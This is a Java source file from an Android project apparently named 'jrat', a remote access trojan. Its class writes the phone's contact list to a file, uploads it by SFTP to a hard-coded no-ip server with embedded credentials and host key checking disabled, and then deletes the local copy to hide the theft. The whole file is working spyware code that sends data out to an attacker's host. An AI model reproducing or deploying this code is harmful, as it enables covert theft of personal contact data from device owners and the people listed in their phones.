package com.julioxus.jrat;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Pair;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Properties;

/**
 * Created by julioxus on 13/03/16.
 */
public class SendContactListAsyncTask extends AsyncTask<Context, Void, String> {

    private Context context;
    private ArrayList<Pair<String,String>> contacts;
    private String android_id;

    public SendContactListAsyncTask(Context context, String android_id, ArrayList<Pair<String, String>> contacts) {
        this.context = context;
        this.contacts = contacts;
        this.android_id = android_id;

    }

    @Override
    protected String doInBackground(Context...params) {

        // Connection variables
        JSch jsch;
        Channel channel;
        Session session = null;
        ChannelSftp c = null;

        String username = "jrat";
        String host = "servidorbicho.no-ip.org";
        String pass = "master2015";

        // Establish connection with the server
        try {
            jsch = new JSch();
            session = jsch.getSession(username, host, 22);
            session.setPassword(pass);

            // Avoid asking for key confirmation
            Properties prop = new Properties();
            prop.put("StrictHostKeyChecking", "no");
            session.setConfig(prop);

            session.connect();

            channel = session.openChannel("sftp");
            channel.connect();
            c = (ChannelSftp) channel;

        } catch (Exception e) {
            e.printStackTrace();
        }

        // Create a file with the contact list to send to the remote server
        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-contacts.txt");
        try {
            file.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Open file
        OutputStream fo = null;
        try {
            fo = new FileOutputStream(file);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

            // Iterate through the contacts list
            for (int i = 0; i < contacts.size(); i++) {
                String s = contacts.get(i).first + " --> " + contacts.get(i).second + "\n";
                byte[] b = s.getBytes();

                // Write the bytes in file
                if (file.exists()) {


                    try {
                        fo.write(b);
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }

                }

            }

            // Close file
            try {
                fo.close();
            } catch (IOException e1) {
                e1.printStackTrace();
            }

            // Send file to server
            try {
                System.out.println("Starting File Upload:");
                String fsrc = file.getPath(), fdest = android_id+"-contacts.txt";
                c.put(fsrc, fdest);
            } catch (Exception e) {
                e.printStackTrace();
            }

            // Close connection
            c.disconnect();
            session.disconnect();

            // Delete the temporary file
            file.delete();
            System.out.println("file deleted");

            return null;
        }
    }
